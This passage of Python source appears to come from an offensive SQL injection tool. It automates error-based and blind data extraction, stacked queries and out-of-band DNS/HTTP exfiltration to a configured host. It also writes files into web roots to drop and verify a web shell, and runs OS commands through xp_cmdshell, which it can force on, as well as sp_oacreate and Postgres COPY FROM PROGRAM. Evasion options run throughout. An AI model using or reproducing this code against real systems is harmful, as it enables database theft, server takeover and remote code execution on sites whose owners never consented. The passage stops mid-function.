def _error_funcs_for(dbms):
    if dbms == "mysql":
        return MYSQL_ERROR_FUNCS
    if dbms == "mssql":
        return MSSQL_ERROR_FUNCS
    if dbms == "oracle":
        return ORACLE_ERROR_FUNCS
    return {}


async def detect_error_oracle(session, point, wrap, limiter, dbms,
                              jar=None, verbose=False, evade=False,
                              baseline_len=None):
    funcs = _error_funcs_for(dbms)
    if not funcs:
        return None

    if dbms == "mysql":
        for name, spec in funcs.items():
            payload = wrap(spec["payload"].format(expr="version()"))
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                continue
            leaked = _parse_error_value_mysql(r[2], spec["marker"])
            if leaked:
                if verbose:
                    info(f"error oracle usable: {name} (leaked {leaked[:40]!r})")
                return name
        return None

    a = "zzqA" + secrets.token_hex(3)
    b = "zzqB" + secrets.token_hex(3)
    for name, spec in funcs.items():
        if dbms == "mssql":
            wrapped = _wrap_sentinel_mssql("'mssql-mark'", a, b)
        else:
            wrapped = _wrap_sentinel_oracle("'oracle-mark'", a, b)

        payload = wrap(spec["payload_template"].format(wrapped_expr=wrapped))
        r = await _send(session, point, limiter, jar,
                        raw_payload=payload, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if r is None:
            continue
        value = _parse_between_sentinels(r[2], a, b)
        if value:
            if verbose:
                info(f"error oracle usable: {name} (leaked {value[:40]!r})")
            return name

    return None


async def error_extract(session, point, wrap, limiter, func_name, sql_query,
                        dbms, jar=None, label="data", verbose=False,
                        evade=False, baseline_len=None):
    funcs = _error_funcs_for(dbms)
    if func_name not in funcs:
        return ""
    spec = funcs[func_name]

    if dbms == "mysql":
        marker = spec["marker"]
        if not spec["windowed"]:
            d = _dialect(dbms)
            wrapped = d["group_concat"](f"({sql_query})")
            payload = wrap(spec["payload"].format(expr=wrapped))
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                return ""
            value = _parse_error_value_mysql(r[2], marker)
            if verbose and value:
                info(f"  {label} (error/{func_name}): {value[:60]!r}")
            return value

        info(f"extracting {label} via error/{func_name} "
             f"({ERROR_WINDOW}B windows)...")
        out = []
        pos = 1
        started = time.monotonic()
        max_windows = (MAX_EXTRACT_CHARS // ERROR_WINDOW) + 2
        prev_chunk = None
        for _ in range(max_windows):
            if time.monotonic() - started > MAX_EXTRACT_SECONDS:
                warn(f"{label!r} exceeded time budget; aborting at byte {pos}")
                break
            window_expr = f"SELECT substring(({sql_query}),{pos},{ERROR_WINDOW})"
            payload = wrap(spec["payload"].format(expr=window_expr))
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                break
            chunk = _parse_error_value_mysql(r[2], marker)
            if not chunk:
                break
            if chunk == prev_chunk and len(chunk) >= ERROR_WINDOW:
                if verbose:
                    warn(f"  {label}: window {pos} repeated; aborting")
                break
            prev_chunk = chunk
            out.append(chunk)
            if verbose:
                info(f"  {label}: window {pos}: {chunk!r}")
            if len(chunk) < ERROR_WINDOW:
                break
            pos += ERROR_WINDOW
        value = "".join(out)
        if verbose and value:
            info(f"  {label} (error/{func_name}): {value[:60]!r}")
        return value

    window = max(40, spec.get("truncate_len", 200) - 20)
    info(f"extracting {label} via error/{func_name} ({window}B windows)...")

    out = []
    pos = 1
    started = time.monotonic()
    max_windows = (MAX_EXTRACT_CHARS // window) + 2
    prev_chunk = None

    for _ in range(max_windows):
        if time.monotonic() - started > MAX_EXTRACT_SECONDS:
            warn(f"{label!r} exceeded time budget; aborting at byte {pos}")
            break

        a = "zzqA" + secrets.token_hex(3)
        b = "zzqB" + secrets.token_hex(3)
        window_expr = f"SELECT substring(({sql_query}),{pos},{window})"
        if dbms == "mssql":
            wrapped = _wrap_sentinel_mssql(window_expr, a, b)
        else:
            wrapped = _wrap_sentinel_oracle(window_expr, a, b)

        payload = wrap(spec["payload_template"].format(wrapped_expr=wrapped))
        r = await _send(session, point, limiter, jar,
                        raw_payload=payload, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if r is None:
            break
        chunk = _parse_between_sentinels(r[2], a, b)
        if not chunk:
            break
        if chunk == prev_chunk and len(chunk) >= window:
            if verbose:
                warn(f"  {label}: window {pos} repeated; aborting")
            break
        prev_chunk = chunk
        out.append(chunk)
        if verbose:
            info(f"  {label}: window {pos}: {chunk!r}")
        if len(chunk) < window:
            break
        pos += window

    value = "".join(out)
    if verbose and value:
        info(f"  {label} (error/{func_name}): {value[:60]!r}")
    return value


# ---------------------------------------------------------------------
# Stacked query detection
# ---------------------------------------------------------------------

async def detect_stacked(session, point, wrap, limiter, dbms, jar=None,
                         verbose=False, evade=False, baseline_len=None):
    if dbms not in ("mysql", "mssql"):
        return False

    base = await _send(session, point, limiter, jar,
                       raw_payload=wrap("1=1"), evade=evade,
                       baseline_len=baseline_len, verbose=verbose,
                       dbms=dbms)
    if base is None:
        return False
    base_hash = _hash(base[2])

    benign = await _send(session, point, limiter, jar,
                         raw_payload=wrap("1=1") + "; SELECT 1",
                         evade=evade, baseline_len=baseline_len,
                         verbose=verbose, dbms=dbms)
    if benign is None:
        return False

    if dbms == "mysql":
        failing_payload = wrap("1=1") + "; SELECT extractvalue(1,concat(0x7e,'x'))"
    else:
        failing_payload = wrap("1=1") + "; SELECT 1/0"
    failing = await _send(session, point, limiter, jar,
                          raw_payload=failing_payload, evade=evade,
                          baseline_len=baseline_len, verbose=verbose,
                          dbms=dbms)
    if failing is None:
        return False

    benign_same = _hash(benign[2]) == base_hash
    failing_differs = _hash(failing[2]) != base_hash

    ok = benign_same and failing_differs
    if verbose:
        info(f"stacked for {point.name!r}: "
             f"benign_same={benign_same} failing_differs={failing_differs} "
             f"=> {ok}")
    return ok


# ---------------------------------------------------------------------
# Blind extraction
# ---------------------------------------------------------------------

async def _hash_probe(session, point, wrap, cond, limiter, jar=None,
                      evade=False, baseline_len=None, verbose=False,
                      dbms=None):
    r = await _send(session, point, limiter, jar,
                    raw_payload=wrap(cond), evade=evade,
                    baseline_len=baseline_len, verbose=verbose, dbms=dbms)
    if r is None:
        return None
    return _hash(r[2]), r[3]


async def check_hash_condition(session, point, wrap, cond, limiter,
                               true_hash, jar=None, evade=False,
                               baseline_len=None, verbose=False, dbms=None):
    r = await _hash_probe(session, point, wrap, cond, limiter, jar, evade,
                          baseline_len, verbose, dbms)
    return None if r is None else r[0] == true_hash


async def check_time_condition(session, point, wrap, cond, limiter,
                               dbms, baseline, jar=None, evade=False,
                               baseline_len=None, verbose=False):
    d = _dialect(dbms)
    if d["sleep"] is None:
        return None
    sleep_expr = d["sleep"](TIME_ORACLE_SLEEP)
    combined = f"({cond}) AND ({sleep_expr})"
    r = await _send(session, point, limiter, jar,
                    raw_payload=wrap(combined), evade=evade,
                    baseline_len=baseline_len, verbose=verbose, dbms=dbms)
    return None if r is None else (r[3] - baseline) >= TIME_ORACLE_MIN_DELTA


async def extract_sql_data(session, point, wrap, limiter, oracle_kind,
                           oracle_state, sql_query, dbms, jar=None,
                           label="data", verbose=False, evade=False,
                           baseline_len=None):
    d = _dialect(dbms)
    info(f"extracting {label} via {point.name!r} "
         f"[blind/{oracle_kind}, {dbms}]...")
    extracted = ""
    started = time.monotonic()

    for char_pos in range(1, MAX_EXTRACT_CHARS + 1):
        if time.monotonic() - started > MAX_EXTRACT_SECONDS:
            warn(f"{label!r} exceeded time budget "
                 f"({MAX_EXTRACT_SECONDS}s); aborting at char {char_pos}")
            break

        if char_pos > 1 and char_pos % ORACLE_REVALIDATE_EVERY == 1:
            if oracle_kind == "hash":
                t = await _hash_probe(session, point, wrap, "1=1", limiter, jar,
                                      evade, baseline_len, verbose, dbms)
                f = await _hash_probe(session, point, wrap, "1=2", limiter, jar,
                                      evade, baseline_len, verbose, dbms)
                if t is None or f is None or t[0] == f[0]:
                    warn(f"oracle lost during {label!r} at char {char_pos}")
                    break
                oracle_state["true_hash"] = t[0]
            else:
                base = await _send(session, point, limiter, jar,
                                   raw_payload=None, evade=False,
                                   baseline_len=baseline_len, verbose=verbose)
                if base is None:
                    warn(f"baseline lost during {label!r} at char {char_pos}")
                    break
                oracle_state["baseline"] = base[3]

        ascii_expr = d["ascii"](d["substring"](sql_query, char_pos))
        null_cond = f"{ascii_expr} IS NULL"
        if oracle_kind == "hash":
            nr = await check_hash_condition(session, point, wrap, null_cond,
                                            limiter, oracle_state["true_hash"],
                                            jar, evade, baseline_len, verbose,
                                            dbms)
        else:
            nr = await check_time_condition(session, point, wrap, null_cond,
                                            limiter, dbms,
                                            oracle_state["baseline"], jar,
                                            evade, baseline_len, verbose)
        if nr is None:
            warn(f"transport failure during {label!r} NULL probe")
            break
        if nr:
            break

        low, high = 32, 126
        aborted = False
        while low <= high:
            mid = (low + high) // 2
            cond = f"{ascii_expr}>{mid}"
            if oracle_kind == "hash":
                r = await check_hash_condition(session, point, wrap, cond,
                                               limiter,
                                               oracle_state["true_hash"], jar,
                                               evade, baseline_len, verbose,
                                               dbms)
            else:
                r = await check_time_condition(session, point, wrap, cond,
                                               limiter, dbms,
                                               oracle_state["baseline"], jar,
                                               evade, baseline_len, verbose)
            if r is None:
                aborted = True
                break
            if r:
                low = mid + 1
            else:
                high = mid - 1
        if aborted:
            break
        if low < 32 or low > 126:
            break
        extracted += chr(low)
        if verbose:
            info(f"  {label}: {extracted!r}")
    return extracted


# ---------------------------------------------------------------------
# Error-based detection (payload-level)
# ---------------------------------------------------------------------

async def test_payload_task(session, point, payload, limiter, base_errors, sem,
                            jar=None, evade=False, baseline_len=None,
                            verbose=False, dbms=None):
    async with sem:
        r = await _send(session, point, limiter, jar,
                        raw_payload=payload, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if r is None:
            return None
        status, _, body, _, mutation = r
        match = contains_sql_error(body)
        if match and match not in base_errors:
            finding = {
                "type": "sqli", "severity": "high", "url": point.url,
                "parameter": point.name, "injection_kind": point.kind,
                "method": point.method, "payload": payload,
                "http_status": status,
                "dbms": ERROR_SIGNATURES.get(match, "generic"),
                "evidence": f"SQL error signature matched: {match!r}",
            }
            if mutation != "identity":
                finding["mutation_used"] = mutation
            return finding
        return None


# ---------------------------------------------------------------------
# Paginated extraction
# ---------------------------------------------------------------------

async def _paginate_extract(extract_fn, query_template, dbms,
                            label, verbose=False):
    results = []
    truncated = False
    for page in range(MAX_PAGES):
        offset = page * PAGE_SIZE
        query = query_template.format(offset=offset, limit=PAGE_SIZE)
        chunk = await extract_fn(query, f"{label} [p{page}]")
        if not chunk:
            break
        items = [x for x in chunk.split(GC_SEP) if x]
        if not items:
            break
        results.extend(items)
        if len(items) < PAGE_SIZE:
            break
    else:
        truncated = True
        warn(f"{label!r} hit MAX_PAGES ({MAX_PAGES} x {PAGE_SIZE} rows); "
             f"result is likely truncated")
    return results, truncated


# ---------------------------------------------------------------------
# Out-of-band extraction
# ---------------------------------------------------------------------

async def extract_oob(session, point, limiter, dbms, oob_config,
                      jar=None, verbose=False, baseline_len=None):
    if oob_config is None:
        return None
    try:
        from vuln import oob
    except ImportError:
        return None

    if not oob.supports_oob(dbms):
        if verbose:
            warn(f"OOB not supported for {dbms}")
        return None

    marker = oob_config.marker()
    payload = f"; {oob_config.dns_payload_for(dbms, marker)}--"

    if verbose:
        info(f"OOB probe ({dbms}, dns): {payload[:80]}")

    r = await _send(session, point, limiter, jar, raw_payload=payload,
                    baseline_len=baseline_len, verbose=verbose, dbms=dbms)
    if r is None and verbose:
        warn("OOB probe transport failed")

    timeout = getattr(oob_config, "timeout", 5.0)
    if oob_config.dns is not None:
        hit = await oob_config.dns.wait_for_hit(marker, timeout=timeout)
        if hit:
            success(f"OOB DNS hit: {hit['qname']} "
                    f"qtype={hit.get('qtype_name', '?')}")
            return {
                "dbms": dbms,
                "channel": "dns",
                "marker": marker,
                "evidence": f"DNS query for {hit['qname']}",
            }

    if dbms in ("oracle", "postgres") and oob_config.http is not None:
        http_marker = oob_config.marker()
        http_payload = f"; {oob_config.http_payload_for(dbms, http_marker)}--"
        if verbose:
            info(f"OOB probe ({dbms}, http): {http_payload[:80]}")
        await _send(session, point, limiter, jar, raw_payload=http_payload,
                    baseline_len=baseline_len, verbose=verbose, dbms=dbms)
        hit = await oob_config.http.wait_for_hit(http_marker, timeout=timeout)
        if hit:
            success(f"OOB HTTP hit: {hit['path']}?{hit['query_string']}")
            return {
                "dbms": dbms,
                "channel": "http",
                "marker": http_marker,
                "evidence": f"HTTP GET {hit['path']}?{hit['query_string']}",
            }

    if verbose:
        warn("OOB probe sent; no hit received within timeout")
    return None


# ═══════════════════════════════════════════════════════════════════════
# ── SESSION 1 ── File write / web shell
# ═══════════════════════════════════════════════════════════════════════

def wrap_stack(sql, d):
    return f"; {sql}{d['comment']}"


async def _try_file_write(session, point, limiter, dbms, jar=None,
                           path="/tmp/tk_write_test.txt",
                           content="tk-write-probe",
                           verbose=False, evade=False,
                           baseline_len=None):
    d = _dialect(dbms)

    if dbms == "mysql":
        payload = d["str_escape"](content)
        path_esc = d["str_escape"](path)
        sql = f"SELECT '{payload}' INTO OUTFILE '{path_esc}'"
    elif dbms == "postgres":
        payload = d["str_escape"](content)
        path_esc = d["str_escape"](path)
        sql = f"COPY (SELECT '{payload}') TO '{path_esc}'"
    else:
        if verbose:
            info(f"  _try_file_write: {dbms} has no direct file-write "
                 f"primitive; skipping")
        return False

    wrapped = wrap_stack(sql, d)

    r = await _send(session, point, limiter, jar,
                    raw_payload=wrapped, evade=evade,
                    baseline_len=baseline_len, verbose=verbose,
                    dbms=dbms)
    if r is None:
        return False

    body = r[2]
    failure_signatures = (
        "can't create",
        "can't write",
        "access denied",
        "permission denied",
        "could not open file",
        "no such file or directory",
        "secure_file_priv",
        "file exists",
    )
    low = body.lower()
    for sig in failure_signatures:
        if sig in low:
            if verbose:
                warn(f"  _try_file_write: write to {path} failed "
                     f"(matched {sig!r})")
            return False

    if verbose:
        success(f"  _try_file_write: write to {path} appears to have "
                f"succeeded")
    return True


async def _extract_single_value(session, point, limiter, d, jar,
                                 expr, label, verbose=False):
    dbms = DEFAULT_DIALECT
    ctx_name, wrap, oracle_kind, oracle_state = await detect_context(
        session, point, limiter, dbms, jar=jar, verbose=verbose)
    if ctx_name is None:
        return ""

    base_r = await _send(session, point, limiter, jar, raw_payload=None,
                         verbose=verbose)
    baseline_body = base_r[2] if base_r else ""

    n_cols, printable_idx = await detect_union(
        session, point, ctx_name, limiter, dbms, baseline_body,
        jar=jar, verbose=verbose)
    if n_cols is not None:
        val = await union_extract(
            session, point, ctx_name, limiter, n_cols, printable_idx,
            expr, dbms, jar=jar, label=label, verbose=verbose)
        if val:
            return val

    return await extract_sql_data(
        session, point, wrap, limiter, oracle_kind, oracle_state,
        expr, dbms, jar=jar, label=label, verbose=verbose)


async def _find_writable_web_root(session, point, limiter, dbms,
                                   jar=None, target_os="linux",
                                   verbose=False, evade=False,
                                   baseline_len=None):
    d = _dialect(dbms)

    if dbms == "mysql" and verbose:
        try:
            sfp = await _extract_single_value(
                session, point, limiter, d, jar,
                "@@secure_file_priv", "secure_file_priv", verbose=verbose)
            if sfp:
                info(f"  @@secure_file_priv = {sfp!r}")
                if sfp not in ("", "NULL"):
                    warn(f"  secure_file_priv restricts writes to {sfp} — "
                         f"INTO OUTFILE may fail on web roots")
        except Exception:
            pass

    candidates = WEB_ROOT_CANDIDATES.get(target_os, [])
    for root in candidates:
        probe_path = root + f"tk_probe_{secrets.token_hex(4)}.txt"
        ok = await _try_file_write(
            session, point, limiter, dbms, jar=jar,
            path=probe_path, content="probe",
            verbose=verbose, evade=evade, baseline_len=baseline_len)
        if ok:
            info(f"  writable web root: {root}")
            return root
        elif verbose:
            info(f"  not writable: {root}")

    return None


def _shell_path_to_url(shell_path, base_url):
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    for os_key, roots in WEB_ROOT_CANDIDATES.items():
        for root in roots:
            for root_variant in (root, root.replace("/", "\\")):
                if shell_path.startswith(root_variant):
                    rel = shell_path[len(root_variant):].lstrip("/\\")
                    return f"{origin}/{rel}"

    filename = shell_path.replace("\\", "/").rsplit("/", 1)[-1]
    return f"{origin}/{filename}"


async def _drop_web_shell(session, point, limiter, dbms, jar=None,
                           web_root=None, shell_lang="php",
                           target_os="linux", verbose=False,
                           evade=False, baseline_len=None,
                           base_url=None):
    result = {
        "success": False,
        "shell_url": None,
        "shell_path": None,
        "shell_kind": None,
        "writable_root": None,
        "verified": False,
        "error": None,
    }

    d = _dialect(dbms)

    if web_root is None:
        web_root = await _find_writable_web_root(
            session, point, limiter, dbms, jar=jar,
            target_os=target_os, verbose=verbose,
            evade=evade, baseline_len=baseline_len)
        if web_root is None:
            fallback = WEB_ROOT_CANDIDATES.get(target_os, [])
            if fallback:
                web_root = fallback[0]
                if verbose:
                    warn(f"  no writable root confirmed; trying "
                         f"{web_root} anyway")
            else:
                result["error"] = "no web-root candidates for this OS"
                return result

    result["writable_root"] = web_root

    shell_body = SHELL_TEMPLATES.get(shell_lang)
    if shell_body is None:
        result["error"] = f"unknown shell language: {shell_lang}"
        return result

    ext = shell_lang
    filename = f"tk_{secrets.token_hex(4)}.{ext}"
    shell_path = web_root + filename

    if dbms == "mysql":
        body_esc = d["str_escape"](shell_body)
        path_esc = d["str_escape"](shell_path)
        sql = f"SELECT '{body_esc}' INTO OUTFILE '{path_esc}'"
    elif dbms == "postgres":
        body_esc = d["str_escape"](shell_body)
        path_esc = d["str_escape"](shell_path)
        sql = f"COPY (SELECT '{body_esc}') TO '{path_esc}'"
    else:
        result["error"] = f"{dbms} has no file-write primitive in Session 1"
        return result

    wrapped = wrap_stack(sql, d)
    r = await _send(session, point, limiter, jar,
                    raw_payload=wrapped, evade=evade,
                    baseline_len=baseline_len, verbose=verbose,
                    dbms=dbms)
    if r is None:
        result["error"] = "transport failure during shell write"
        return result

    body = r[2]
    low = body.lower()
    for sig in ("can't create", "can't write", "access denied",
                "permission denied", "could not open file",
                "secure_file_priv", "file exists"):
        if sig in low:
            result["error"] = f"write failed (matched {sig!r})"
            return result

    if base_url:
        shell_url = _shell_path_to_url(shell_path, base_url)
    else:
        shell_url = None

    result["success"] = True
    result["shell_path"] = shell_path
    result["shell_kind"] = shell_lang
    result["shell_url"] = shell_url
    return result


async def _verify_web_shell(session, shell_url, limiter,
                              marker=SHELL_VERIFY_MARKER,
                              verbose=False, timeout=10.0):
    if not shell_url:
        return False

    cmd = f"echo {marker}"
    sep = "&" if "?" in shell_url else "?"
    url = f"{shell_url}{sep}c={cmd}"

    try:
        status, _headers, body, _final = await fetch(
            session, url, limiter.base, timeout=timeout)
    except Exception as e:
        if verbose:
            warn(f"  shell verify: {type(e).__name__}: {e}")
        return False

    if status != 200 or not body:
        if verbose:
            warn(f"  shell verify: HTTP {status}, empty body")
        return False

    if marker in body:
        if verbose:
            success(f"  shell verify: marker found, RCE confirmed")
        return True

    if verbose:
        warn(f"  shell verify: marker not in response")
    return False

# ── END SESSION 1 helpers ────────────────────────────────────────────


# ═══════════════════════════════════════════════════════════════════════
# ── SESSION 2 ── OS command execution (MSSQL + Postgres)
# ═══════════════════════════════════════════════════════════════════════

async def _mssql_xp_cmdshell_available(session, point, wrap, limiter,
                                        jar, extract_fn, verbose=False,
                                        evade=False, baseline_len=None):
    expr = ("(SELECT CONVERT(int, value_in_use) FROM sys.configurations "
            "WHERE name='xp_cmdshell')")
    try:
        val = await extract_fn(expr, "xp_cmdshell status")
    except Exception as e:
        if verbose:
            warn(f"  xp_cmdshell probe failed: {type(e).__name__}: {e}")
        return None

    if not val:
        return None
    val = val.strip()
    if val == "1":
        if verbose:
            success("  xp_cmdshell: ENABLED")
        return True
    if val == "0":
        if verbose:
            info("  xp_cmdshell: DISABLED (enable with --aggressive)")
        return False
    if verbose:
        info(f"  xp_cmdshell: could not determine state (got {val!r})")
    return None


async def _mssql_enable_xp_cmdshell(session, point, limiter, jar,
                                     verbose=False, evade=False,
                                     baseline_len=None):
    info("  attempting to enable xp_cmdshell (aggressive mode)")
    statements = [
        "EXEC sp_configure 'show advanced options', 1",
        "RECONFIGURE",
        "EXEC sp_configure 'xp_cmdshell', 1",
        "RECONFIGURE",
    ]
    for stmt in statements:
        wrapped = f"; {stmt}--"
        r = await _send(session, point, limiter, jar,
                        raw_payload=wrapped, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms="mssql")
        if r is None:
            warn(f"  enable step failed: {stmt[:60]}")
            return False
        low = (r[2] or "").lower()
        if ("permission" in low or "denied" in low
                or "not allowed" in low):
            warn(f"  enable step denied: {stmt[:60]}")
            return False
    success("  xp_cmdshell enable sequence sent")
    return True


async def _mssql_run_cmd(session, point, wrap, limiter, jar, cmd,
                          extract_fn, verbose=False, evade=False,
                          baseline_len=None, cleanup=True):
    d = _dialect("mssql")
    tbl = RCE_TABLE_PREFIX + secrets.token_hex(4)
    cmd_esc = d["str_escape"](cmd)

    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; DROP TABLE IF EXISTS {tbl}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")
    if r is None:
        return None

    r = await _send(session, point, limiter, jar,
                    raw_payload=(f"; CREATE TABLE {tbl} "
                                  f"(line NVARCHAR(MAX))--"),
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")
    if r is None:
        return None
    if "already exists" in (r[2] or "").lower():
        await _send(session, point, limiter, jar,
                    raw_payload=f"; DROP TABLE {tbl}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")
        r = await _send(session, point, limiter, jar,
                        raw_payload=(f"; CREATE TABLE {tbl} "
                                      f"(line NVARCHAR(MAX))--"),
                        evade=evade, baseline_len=baseline_len,
                        verbose=verbose, dbms="mssql")
        if r is None:
            return None

    r = await _send(session, point, limiter, jar,
                    raw_payload=(f"; INSERT INTO {tbl} "
                                  f"EXEC master..xp_cmdshell "
                                  f"'{cmd_esc}'--"),
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")
    if r is None:
        return None

    agg = d["concat"](["'"+RCE_SENTINEL_A+"'",
                       "string_agg(ISNULL(line,''), char(10))",
                       "'"+RCE_SENTINEL_B+"'"])
    expr = f"(SELECT {agg} FROM {tbl})"
    try:
        raw = await extract_fn(expr, "xp_cmdshell output")
    except Exception as e:
        warn(f"  xp_cmdshell output extraction failed: "
             f"{type(e).__name__}: {e}")
        raw = ""

    output = _strip_rce_sentinels(raw)

    if cleanup:
        await _send(session, point, limiter, jar,
                    raw_payload=f"; DROP TABLE {tbl}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")

    if verbose and output:
        info(f"  xp_cmdshell output ({len(output)}B): "
             f"{output[:120]!r}")
    return output if output else ""


async def _mssql_sp_oacreate_run_cmd(session, point, wrap, limiter, jar,
                                      cmd, extract_fn, verbose=False,
                                      evade=False, baseline_len=None):
    d = _dialect("mssql")
    cmd_esc = d["str_escape"](cmd)

    batch = (
        f"DECLARE @o INT, @r INT, @out VARCHAR(8000); "
        f"EXEC sp_oacreate 'wscript.shell', @o OUT; "
        f"EXEC sp_oamethod @o, 'exec', @r OUT, '{cmd_esc}'; "
        f"WAITFOR DELAY '0:0:1'; "
        f"EXEC sp_oamethod @r, 'StdOut.ReadAll', @out OUT; "
        f"RAISERROR('{RCE_SENTINEL_A}%s{RCE_SENTINEL_B}', 0, 1, @out) "
        f"WITH NOWAIT"
    )
    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; {batch}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="mssql")
    if r is None:
        return None

    body = r[2] or ""
    a_idx = body.find(RCE_SENTINEL_A)
    b_idx = body.find(RCE_SENTINEL_B, a_idx + len(RCE_SENTINEL_A))
    if a_idx < 0 or b_idx < 0:
        if verbose:
            warn("  sp_oacreate: sentinels not found in response")
        return ""

    output = body[a_idx + len(RCE_SENTINEL_A):b_idx]
    if verbose and output:
        info(f"  sp_oacreate output ({len(output)}B): "
             f"{output[:120]!r}")
    return output


async def _postgres_copy_to_program_available(session, point, wrap,
                                                limiter, jar, extract_fn,
                                                verbose=False, evade=False,
                                                baseline_len=None):
    expr = ("(SELECT CASE WHEN "
            "(SELECT usesuper FROM pg_user WHERE usename=current_user) "
            "OR EXISTS (SELECT 1 FROM pg_roles WHERE rolname=current_user "
            "AND (rolsuper OR pg_has_role(current_user, "
            "'pg_execute_server_program', 'member'))) "
            "THEN '1' ELSE '0' END)")
    try:
        val = await extract_fn(expr, "copy_to_program privilege")
    except Exception as e:
        if verbose:
            warn(f"  copy_to_program probe failed: "
                 f"{type(e).__name__}: {e}")
        return None

    if not val:
        return None
    val = val.strip()
    if val == "1":
        if verbose:
            success("  COPY TO PROGRAM: available")
        return True
    if val == "0":
        if verbose:
            info("  COPY TO PROGRAM: not available (need superuser or "
                 "pg_execute_server_program)")
        return False
    return None


async def _postgres_run_cmd(session, point, wrap, limiter, jar, cmd,
                             extract_fn, verbose=False, evade=False,
                             baseline_len=None, cleanup=True):
    d = _dialect("postgres")
    tbl = RCE_TABLE_PREFIX + secrets.token_hex(4)
    cmd_esc = d["str_escape"](cmd)

    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; DROP TABLE IF EXISTS {tbl}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="postgres")
    if r is None:
        return None

    r = await _send(session, point, limiter, jar,
                    raw_payload=f"; CREATE TABLE {tbl} (line text)--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="postgres")
    if r is None:
        return None

    r = await _send(session, point, limiter, jar,
                    raw_payload=(f"; COPY {tbl} FROM PROGRAM "
                                  f"'{cmd_esc}'--"),
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="postgres")
    if r is None:
        return None

    agg = d["concat"](["'"+RCE_SENTINEL_A+"'",
                       "string_agg(line, chr(10))",
                       "'"+RCE_SENTINEL_B+"'"])
    expr = f"(SELECT {agg} FROM {tbl})"
    try:
        raw = await extract_fn(expr, "copy_to_program output")
    except Exception as e:
        warn(f"  copy_to_program output extraction failed: "
             f"{type(e).__name__}: {e}")
        raw = ""

    output = _strip_rce_sentinels(raw)

    if cleanup:
        await _send(session, point, limiter, jar,
                    raw_payload=f"; DROP TABLE {tbl}--",
                    evade=evade, baseline_len=baseline_len,
                    verbose=verbose, dbms="postgres")

    if verbose and output:
        info(f"  copy_to_program output ({len(output)}B): "
             f"{output[:120]!r}")
    return output if output else ""


def _strip_rce_sentinels(raw):
    if not raw:
        return ""
    out = raw
    for marker in (RCE_SENTINEL_A, RCE_SENTINEL_B):
        out = out.replace(marker, "")
    out = out.strip()
    if len(out) > RCE_MAX_OUTPUT:
        out = out[:RCE_MAX_OUTPUT] + "...[truncated]"
    return out


async def _run_os_command(session, point, wrap, limiter, jar, dbms, cmd,
                          extract_fn, oob_config=None, aggressive=False,
                          verbose=False, evade=False, baseline_len=None):
    available = None

    if dbms == "mssql":
        available = await _mssql_xp_cmdshell_available(
            session, point, wrap, limiter, jar, extract_fn,
            verbose=verbose, evade=evade, baseline_len=baseline_len)

        if available is False and aggressive:
            enabled = await _mssql_enable_xp_cmdshell(
                session, point, limiter, jar,
                verbose=verbose, evade=evade, baseline_len=baseline_len)
            if enabled:
                available = True

        if available is True:
            out = await _mssql_run_cmd(
                session, point, wrap, limiter, jar, cmd, extract_fn,
                verbose=verbose, evade=evade, baseline_len=baseline_len)
            if out is not None:
                return {"method": "xp_cmdshell", "cmd": cmd, "output": out}

        if verbose:
            info("  xp_cmdshell unavailable; trying sp_oacreate")
        out = await _mssql_sp_oacreate_run_cmd(
            session, point, wrap, limiter, jar, cmd, extract_fn,
            verbose=verbose, evade=evade, baseline_len=baseline_len)
        if out is not None:
            return {"method": "sp_oacreate", "cmd": cmd, "output": out}

    elif dbms == "postgres":
        available = await _postgres_copy_to_program_available(
            session, point, wrap, limiter, jar, extract_fn,
            verbose=verbose, evade=evade, baseline_len=baseline_len)

        if available is True:
            out = await _postgres_run_cmd(
                session, point, wrap, limiter, jar, cmd, extract_fn,
                verbose=verbose, evade=evade, baseline_len=baseline_len)
            if out is not None:
                return {"method": "copy_to_program", "cmd": cmd,
                        "output": out}

    if oob_config is not None and oob_config.http is not None:
        marker = oob_config.marker()
        oob_cmd = _build_oob_cmd(dbms, cmd, oob_config, marker)
        if oob_cmd:
            if verbose:
                info(f"  OOB fallback command: {oob_cmd[:100]}")
            sent = False
            if dbms == "mssql" and available is True:
                await _send(session, point, limiter, jar,
                            raw_payload=(f"; EXEC master..xp_cmdshell "
                                          f"'{_dialect('mssql')['str_escape'](oob_cmd)}'--"),
                            evade=evade, baseline_len=baseline_len,
                            verbose=verbose, dbms="mssql")
                sent = True
            elif dbms == "postgres" and available is True:
                await _send(session, point, limiter, jar,
                            raw_payload=(f"; COPY (SELECT 1) TO PROGRAM "
                                          f"'{_dialect('postgres')['str_escape'](oob_cmd)}'--"),
                            evade=evade, baseline_len=baseline_len,
                            verbose=verbose, dbms="postgres")
                sent = True

            if sent:
                hit = await oob_config.http.wait_for_hit(marker,
                                                          timeout=5.0)
                if hit:
                    success(f"  OOB hit: {hit['path']}?"
                            f"{hit['query_string']}")
                    return {
                        "method": "oob",
                        "cmd": cmd,
                        "output": "",
                        "oob_hit": hit,
                    }

    return None


def _build_oob_cmd(dbms, cmd, oob_config, marker):
    host = oob_config.public_host
